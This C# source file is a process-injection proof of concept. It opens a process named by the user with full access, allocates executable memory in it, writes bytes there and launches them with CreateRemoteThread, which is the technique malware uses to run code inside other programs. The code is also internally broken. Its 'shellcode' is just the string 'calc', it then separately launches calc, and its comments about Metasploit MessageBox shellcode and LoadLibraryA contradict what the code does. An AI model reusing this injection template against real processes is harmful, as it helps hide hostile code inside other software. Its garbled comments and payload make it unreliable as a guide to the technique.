using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Runtime.Serialization;
using System.Text;
public class InjectionPoC
{

	[DllImport("kernel32.dll")]
	public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

	[DllImport("kernel32.dll", CharSet = CharSet.Auto)]
	public static extern IntPtr GetModuleHandle(string lpModuleName);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

	[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
	static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

	[DllImport("kernel32.dll", SetLastError = true)]
	static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

	[DllImport("kernel32.dll")]
	static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

	public static void Main(string[] args)
	{
		System.Console.WriteLine("Please input process name.");

		string processor;
		processor = Console.ReadLine();

		Console.WriteLine("Start injection...");
		Process targetProcess;

		try
		{
			targetProcess = Process.GetProcessesByName(processor)[0];
		}
		catch
		{
			System.Console.WriteLine("Process " + processor + " not found!");
			return;
		}

		// Get process handler
		IntPtr process_handle = OpenProcess(0x1F0FFF, false, targetProcess.Id);
		
		// The MessageBox shellcode, generated with Metasploit
		string shellcodeStr = "calc";

		// Convert shellcode string to byte array
		Byte[] shellcode = new Byte[shellcodeStr.Length];
		for (int i = 0; i < shellcodeStr.Length; i++)
		{
			shellcode[i] = (Byte)shellcodeStr[i];
		}

		// Allocate a memory space in target process, big enough to store the shellcode
		IntPtr memory_allocation_variable = VirtualAllocEx(process_handle, IntPtr.Zero, (uint)(shellcode.Length), 0x00001000, 0x40);

		// Write the shellcode
		UIntPtr bytesWritten;
		WriteProcessMemory(process_handle, memory_allocation_variable, shellcode, (uint)(shellcode.Length), out bytesWritten);

		// Create a thread that will call LoadLibraryA with allocMemAddress as argument
		if (CreateRemoteThread(process_handle, IntPtr.Zero, 0, memory_allocation_variable, IntPtr.Zero, 0, IntPtr.Zero) != IntPtr.Zero)
		{
			System.Diagnostics.Process.Start(shellcodeStr);
			Console.Write("Injection done!");
		}
		else
		{
			Console.Write("Injection failed!");
		}
	}
}